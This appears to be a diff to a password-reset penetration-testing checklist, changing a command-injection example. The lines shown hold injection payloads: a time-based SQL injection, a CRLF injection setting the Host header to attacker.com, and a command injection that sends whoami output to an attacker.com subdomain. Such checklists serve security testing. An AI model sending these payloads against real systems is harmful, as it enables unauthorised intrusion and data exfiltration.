@@ -44,7 +44,7 @@ POST /resetpassword.php@attacker.com HTTP/1.1
 10. Injection Attacks
     - SQLi: `test@test.com'+(select*from(select(sleep(2)))a)+'`
     - CRLF Injection: `/resetpassword?%0d%0aHost:%20attacker.com`
-    - Command Injection: `email=hello@'$(whoami)'.attacker.com`
+    - Command Injection: ```email=hello@`whoami`.attacker.com```
 11. User Enumeration
     - Check if errors or responses reveal whether an account exists.
 12. Edge Cases
